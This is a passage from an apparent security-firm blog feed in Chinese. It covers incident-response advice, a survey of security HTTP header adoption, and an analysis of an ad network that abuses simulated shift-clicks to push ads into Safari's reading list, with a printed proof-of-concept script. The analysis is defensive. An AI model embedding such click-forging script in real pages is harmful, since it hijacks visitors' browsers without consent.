  &lt;li&gt;問題 1：該系統是否還有其他漏洞？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果一個在開發時期就沒有注意安全的系統，很有可能有更多不為人知的漏洞。如果被動依賴資安事件，發生一件修一個漏洞，那是永無止盡的。正確的方式應該是直接針對 A 廠商的原始碼進行黑箱&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;、白箱源碼檢測 (Code Review)，才能快速找出所有風險。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 2：公司的處置是否正確？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;「貨比三家不吃虧」，節儉確實是美德，但是在資訊產業中，越便宜的系統可能代表著更多的 cost down，除了犧牲掉品質之外，可能帶給企業更多損失。在資安事件發生時，一定要找原本維運廠商負責，並且與資安顧問公司配合，協助廠商把問題解決。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 3：A 廠商的其他客戶是否有類似的問題？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;羅馬不是一日造成的，不安全的系統也不是一個漏洞造成的。廠商通常是做出一份系統，客製化販賣給不同的企業用戶。如果在建置的過程中沒有注意安全問題，今天這家客戶有這個漏洞，別的客戶一定也會有。因此如果採用了不良的廠商實作的系統，下一個被駭的可能就是自己。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 4：不是有買資安設備？為什麼還會有資安事件？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;「不是有買防火牆嗎？怎麼還會被入侵？」是很多傳統思維企業的共同心聲。防火牆不是萬靈丹，駭客也絕對不是電腦。並不是完全依賴資安設備就能夠避免資安問題。在駭客的手法中，更多是如何繞過各種防禦設備手段，甚至有些資安設備本身竟然含有資安弱點，企業反而因為資安設備導致系統被入侵。&lt;/p&gt;

&lt;p&gt;正確的思維應該是從人開始做起，建立正確的資安觀念、資安思維，學習駭客的思維。建立正確的系統開發流程、建立正確的資安事件處理流程。尋找信譽良好的資安顧問廠商，定期針對企業內部各系統進行滲透測試、弱點掃描。安全的建立絕非一蹴可及，唯有一步步踏穩才能走得更遠。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 5：公司該如何自保？&lt;/li&gt;
  &lt;li&gt;問題 6：廠商該如何自保？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;請看下一個章節「建議對策」。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;建議對策&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.flickr.com/photos/26604430@N05/5895021311/&quot;&gt;&lt;img src=&quot;http://farm6.staticflickr.com/5280/5895021311_3aaef7fec0_z.jpg&quot; alt=&quot;Countermeasure&quot; title=&quot;Countermeasure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;一個安全的系統，絕對是由基礎建設開始，每個環節都兼顧到安全的設計，並且定期稽核程式碼安全，使用正確安全的方式開發。如果系統開發初期就沒有兼顧安全，後期不管怎麼修補，都還是會有漏洞讓攻擊者有機可趁。&lt;/p&gt;

&lt;p&gt;企業該如何自保？使用 OpenSource 第三方套件或者是系統委外開發，是企業無可避免的。如果是第三方套件，平時可以多加注意套件的資安消息，如果一有新的漏洞被發現，將可以在第一時間應變。若沒有足夠人力密切注意資安消息，也可以委請資安顧問廠商協助，在得知資安消息的第一時間通報企業。委外開發的系統，企業可以要求廠商提出專業公正第三方資安公司進行檢測，並且提出安全報告，證明該系統有經過滲透測試等安全檢測，保障雙方的權利。&lt;/p&gt;

&lt;p&gt;如果系統已經被入侵了，或者是被揭露了安全漏洞，該如何自保呢？在漏洞大量揭露的情況下，系統更會成為攻擊者的目標。因此要務必密切注意使用該套件的伺服器狀況，並且遵循以下原則：
* 密切注意官方的更新程式並立即更新
* 此台伺服器的帳號密碼切勿與他台共用
* 將此台伺服器與其他伺服器隔離，避免遭入侵時受害範圍擴大
* 異地備份伺服器的系統記錄，並定時檢閱記錄，觀察是否有可疑行為
* 考慮採用 Web Application Firewall (WAF)、ModSecurity 伺服器安全模組，增加攻擊難度
* 重新評估使用遭入侵套件的必要性以及安全考量，避免成為企業的隱含風險
使用第三方套件加速開發節省成本的同時，務必也要考慮安全的問題，才不會因小失大，造成企業更大的損失。同時企業也必須增加資安的素養以及了解攻擊者的思維，別讓自己的企業成為下一個資安事件報導的對象。&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>HTTP Headers 的資安議題 (1)</title>
   <link href="http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/"/>
   <updated>2014-03-10T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1</id>
   <content type="html">
&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;隨著駭客攻擊事件日益漸增，原本經常被大眾所忽視的網站資安問題，現在已經逐漸受到重視。但是，許多企業主或開發人員雖然很想強化網站的安全性，卻不知道該如何從何著手。&lt;/p&gt;

&lt;p&gt;企業主通常想到的改善方案是添購資安設備，希望可以一勞永逸。我們姑且先不談「&lt;strong&gt;資訊界沒有永遠的安全&lt;/strong&gt;」這件事，企業光是要買到有效的資安設備就是一件令人頭痛的事情，不但要花許多時間聽取廠商的簡報，耗費大筆的經費採購，購買之後還要請員工或原廠技術人員協助調校、設定或教學，否則買了等於沒買。&lt;/p&gt;

&lt;p&gt;而對於技術人員來說，若要強化網站安全性，必須先了解駭客如何攻擊，才知道如何建立根本性的防禦機制。但是企業主通常捨不得送員工去參加專業的教育訓練，台灣員工拿的 22k 低薪也低得常常令人捨不得花錢去上課。&lt;/p&gt;

&lt;p&gt;如果有一種方式可以增強網站的基本安全性，而且不需要花大錢，又可以讓開發人員不用大幅度變更程式，應該是個皆大歡喜的方案？&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;section-1&quot;&gt;究竟有沒有低成本的簡易防禦方法？&lt;/h3&gt;

&lt;p&gt;有的！目前各家瀏覽器 (Google Chrome、Firefox、Safari、IE) 其實已經支援許多種資安相關的 HTTP headers。開發人員若在伺服器設定加入某些 headers，瀏覽器收到 response 時就會執行相對應的防禦機制，如此一來可直接提升網頁應用程式的基本安全性。這些 HTTP headers 通常也已被許多常見的 framework 納入爲基本功能，即使開發人員不清楚如何修改伺服器相關設定，也可以依靠 framework 提供的方式來使用這些 headers。因此使用這些 headers 來提升網站安全性就成爲頗具 CP 值的方式。&lt;/p&gt;

&lt;p&gt;目前最常見的資安相關 HTTP headers 可參考 &lt;a href=&quot;https://www.owasp.org/index.php/List_of_useful_HTTP_headers&quot;&gt;OWASP 網站&lt;/a&gt; 所條列的內容：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy (X-Content-Security-Policy、X-Webkit-CSP 都是同一系列)&lt;/li&gt;
  &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
  &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
  &lt;li&gt;X-Frame-Options&lt;/li&gt;
  &lt;li&gt;X-XSS-Protection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;還有一些其他的資安相關 HTTP headers 也值得注意：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access-Control-Allow-Origin&lt;/li&gt;
  &lt;li&gt;X-Download-Options&lt;/li&gt;
  &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最後有一項比較特別的是 Cookie 的安全設定，由於 Cookie 也是 HTTP headers 的一部份，因此本文也將其列出：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
  &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上述 headers 的數量是不是稍微超過你的想像？其實這些技術早已被很多大公司採用，像是 Google、Facebook、Twitter 等常見的網路服務都可看到這些 headers 的蹤影。下面這張圖片使用 Chrome 的 Inspector 來觀察 Twitter 的 HTTP response 內容：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-6dyPHEZZ6RU/UxlujAnSihI/AAAAAAAAAIg/Yq2xC_M4dV8/w1138-h954-no/http-headers-twitter.jpg&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-6dyPHEZZ6RU/UxlujAnSihI/AAAAAAAAAIg/Yq2xC_M4dV8/w1138-h954-no/http-headers-twitter.jpg&quot; alt=&quot;Twitter 的 HTTP reponse&quot; title=&quot;Twitter 的 HTTP reponse&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從畫紅線的部分我們可看到 Twitter 在 Cookie 設定了 Secure 與 HttpOnly 這兩個屬性，並且採用了 Strict-Transport-Security、X-Content-Type-Options、X-Frame-Options、X-XSS-Protection 這幾種 headers。&lt;/p&gt;

&lt;p&gt;如果覺得用圖形界面太麻煩，也可以使用 command line 的工具來觀察。下面這張圖片使用 curl 來觀察 Facebook 的 HTTP response 內容：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-wKFIH6kIZDk/UxybqPYO60I/AAAAAAAAAI4/t12_TyJz3cA/w1096-h370-no/http-headers-facebook.jpg&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-wKFIH6kIZDk/UxybqPYO60I/AAAAAAAAAI4/t12_TyJz3cA/w1096-h370-no/http-headers-facebook.jpg&quot; alt=&quot;Facebook 的 HTTP response&quot; title=&quot;Facebook 的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;headers-&quot;&gt;上述資安相關的 headers 想解決哪些問題？&lt;/h3&gt;

&lt;p&gt;目前這些資安相關的 HTTP headers 想解決的問題主要可分為以下五大類：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;防禦 XSS (Cross Site Scripting)：
    &lt;ul&gt;
      &lt;li&gt;Content-Security-Policy&lt;/li&gt;
      &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
      &lt;li&gt;X-XSS-Protection&lt;/li&gt;
      &lt;li&gt;X-Download-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;防禦 Clickjacking：
    &lt;ul&gt;
      &lt;li&gt;X-Frame-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;強化 HTTPS 機制：
    &lt;ul&gt;
      &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
      &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;避免瀏覽器誤判文件形態：
    &lt;ul&gt;
      &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;保護網站資源別被任意存取：
    &lt;ul&gt;
      &lt;li&gt;Access-Control-Allow-Origin（此 header 若設定錯誤會適得其反！）&lt;/li&gt;
      &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中 &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)&quot;&gt;XSS&lt;/a&gt; 與 &lt;a href=&quot;https://www.owasp.org/index.php/Clickjacking&quot;&gt;Clickjacking&lt;/a&gt; 是目前常見的攻擊手法，尤其 XSS 目前仍高居 &lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;OWASP Top 10 2013 的第三名&lt;/a&gt;，其嚴重性可見一斑。而在我們執行過的許多&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;案之中，被我們找出 XSS 弱點的網站高達九成！實在是不能輕忽這些問題。若能降低這些手法攻擊成功的機率，企業的利益就能有更多的安全保障，客戶對企業的信賴亦會更加穩固。&lt;/p&gt;

&lt;h3 id=&quot;headers--1&quot;&gt;目前這些 headers 的使用狀況？&lt;/h3&gt;

&lt;p&gt;這麼簡便的基本防禦方式，理當廣為企業所採用，因此我們針對 &lt;a href=&quot;http://www.alexa.com/topsites/countries/TW&quot;&gt;Alexa Taiwan Top 525&lt;/a&gt; 中挑出 513 個可正常使用的網站（咦？一般不是 Top 500 嗎？我沒騙你，&lt;a href=&quot;http://www.alexa.com/topsites/countries;20/TW&quot;&gt;真的有 525&lt;/a&gt;），調查這些網站是否使用某些常見的 HTTP headers。結果相當令人失望，許多網站都未採用這些 headers。統計數據如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-EGrtPA75hno/Uxy4jyFD9PI/AAAAAAAAAJc/QDhb3lIDtHw/w369-h201-no/http-headers-statistic-alexa-taiwan.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-EGrtPA75hno/Uxy4jyFD9PI/AAAAAAAAAJc/QDhb3lIDtHw/w369-h201-no/http-headers-statistic-alexa-taiwan.png&quot; alt=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; title=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從統計結果中可發現最多人使用的 HttpOnly 只有 21.25%，排名第二的 X-Frame-Options 也只有 7.80%。而且這些數據尚未將 Google、Twitter 等大公司排除，若將前述國際公司排除後，這些比率恐怕會更低。&lt;/p&gt;

&lt;p&gt;不過在上述網站中有不少入口網站、漫畫網站、色情網站，或是公司並非台灣企業，無法反應台灣的使用狀況。恰好在 2012 年 10 月台灣有許多網路服務公司一同成立了 &lt;a href=&quot;http://www.tieataiwan.org/index.php&quot;&gt;TIEA 台灣網路暨電子商務產業發展協會&lt;/a&gt;，目前網站上的&lt;a href=&quot;http://www.tieataiwan.org/member.php&quot;&gt;會員名單&lt;/a&gt;中有 116 個會員，其中不少頗具代表性，正好可觀察這些公司營運的網站是否有採用這些 headers。統計數據如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-iG4K8bQRP-U/Uxy4vfPsqPI/AAAAAAAAAJo/x66oSzmqwoM/w369-h201-no/http-headers-statistic-tiea.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-iG4K8bQRP-U/Uxy4vfPsqPI/AAAAAAAAAJo/x66oSzmqwoM/w369-h201-no/http-headers-statistic-tiea.png&quot; alt=&quot;HTTP headers statistic of TIEA&quot; title=&quot;HTTP headers statistic of TIEA&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;很可惜地，所有 headers 的採用率比起上一份數據都還要低。除非公司網站僅使用靜態頁面，網站上沒有任何商業邏輯、帳號、個資，否則應該都要使用合適的 headers 為你的資安防禦工事多築一道牆。&lt;/p&gt;

&lt;p&gt;而且由於 meeya 目前沒有正式官網，是直接使用 facebook 粉絲頁作為官網，因此 Content-Security-Policy、Set-Cookie Secure、Strict-Transport-Security、X-Content-Type-Options、X-Frame-Options、X-XSS-Protection 等六項 headers 的統計數量都還要再減一，頓時 Content-Security-Policy 與 Strict-Transport-Security 的總數量皆降至 0 個。此狀況顯示出，即使是在一些台灣主流的網站中，相關營運人員在資安領域仍有許多努力與學習的空間。&lt;/p&gt;

&lt;p&gt;許多台灣企業經常顧著衝業績、開發新功能、趕著讓新服務上線，卻忽略了非常重要的基礎資安建設，往往是在遭到攻擊後才大呼損失慘重，甚至是已被滲透了而不自知，其企業利益與民眾個資的保障皆相當令人擔憂。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;下集預告&lt;/h3&gt;

&lt;p&gt;接下來本文的續作我們會分幾個篇章詳談各種 headers 的使用方式並介紹實際案例，下一篇將會探討專門防禦 XSS 的 HTTP headers，敬請期待！等不及的朋友們就請先用上面的一些關鍵字自行上網查詢囉！&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>奇優廣告 Qiyou 廣告手法剖析</title>
   <link href="http://devco.re/blog/2014/03/06/qiyou-ads-hijacking/"/>
   <updated>2014-03-06T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/03/06/qiyou-ads-hijacking</id>
   <content type="html">
&lt;p&gt;歡迎來到我們的技術文章專欄！&lt;/p&gt;

&lt;p&gt;今天我們來談談「廣告顯示手法」。不少廣告商為了要增加廣告的曝光以及點擊率，會使用各種手法強迫使用者顯示廣告。例如彈出式視窗、內嵌廣告、強制跳轉等等。但這樣的手法有什麼好提的呢？今天有一個很特別的案例，讓我們來看看一個網站「&lt;a href=&quot;http://1kkk.com&quot;&gt;1kkk.com 極速漫畫&lt;/a&gt;」。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/4pevslM2QNBVcXug76t7MCziPk5ms9U1gK76fXqLyQ=w839-h634-no&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; /&gt;
這是一個常見的網路漫畫網站，接著點擊進去漫畫頁面。
&lt;!-- more --&gt;
&lt;img src=&quot;https://lh6.googleusercontent.com/-Q9pSLJQc0Ak/Uxf8YrS0tNI/AAAAAAAAAHQ/lZNQcky2r8k/w839-h634-no/blog_qiyou_hijack_03.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; /&gt;
網站中充斥著煩人的廣告，並且突然一閃而過 Safari 的「閱讀列表」動畫。怎麼會突然這樣呢？讓我們打開「閱讀列表」一探究竟。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-4s9QKuK9ANs/Uxf8ZVeIr-I/AAAAAAAAAHE/C06SoY1VyMI/w262-h525-no/blog_qiyou_hijack_04.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; /&gt;
&lt;img src=&quot;https://lh6.googleusercontent.com/-gWdJCWw41dY/Uxf8ZtMwpuI/AAAAAAAAAHM/m9WbSBbnJSM/w839-h634-no/blog_qiyou_hijack_05.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; /&gt;&lt;/p&gt;

&lt;p&gt;打開閱讀列表之後，我們赫然發現裡面被加了非常多廣告的頁面！&lt;/p&gt;

&lt;p&gt;可以看以下影片示範：&lt;/p&gt;
&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;http://www.youtube.com/embed/E-BGf1MwecU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;這是怎麼做到的呢？就是一種利用 JavaScript 控制滑鼠點擊的變形應用。點選「網頁檢閱器」或是「開發者工具」，會看到一段奇怪的 JavaScript 控制滑鼠的點擊行為。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-Ngnx2PsIyNw/Uxf8ZtZtfSI/AAAAAAAAAHU/NEvZLh6a09M/w795-h634-no/blog_qiyou_hijack_06.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; /&gt;&lt;/p&gt;

&lt;p&gt;分析節錄後的 code 如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;href&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;display:none;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;MouseEvents&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initMouseEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;click&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dispatchEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// nothing.&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;http://google.com/?&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Test: FORCE_ADD_URL_TO_READINGLIST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;利用「&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&quot;&gt;initMouseEvent&lt;/a&gt;」模擬滑鼠的點擊，在 URL 上按下 Shift 鍵點擊。在一般瀏覽器中是「開啟新視窗」，在 Safari 中則是「加入閱讀清單」了，因此形成廣告視窗不斷加入閱讀清單的現象。廣告商利用這種手法增加廣告的點擊率，只要瀏覽器沒有安裝阻擋廣告的套件或者是阻擋「彈出式視窗」，你就會成為流量的貢獻者。&lt;/p&gt;

&lt;p&gt;經過我們的測試，Internet Explorer、Mozilla Firefox 不會受這類攻擊影響，Google Chrome、Opera 則會被內建的 Pop-up 視窗阻擋功能擋下。但若是直接模擬點擊，則全數瀏覽器都會受影響導向至 URL。雖然這種類型的攻擊不會造成實質上的損失跟危害，但若是結合其他惡意手法將可以造成攻擊。例如透過網站掛碼將使用者導向至惡意網站等等。&lt;/p&gt;

&lt;p&gt;若要避免此類型攻擊，有以下幾個建議方案：&lt;/p&gt;

&lt;ol&gt;
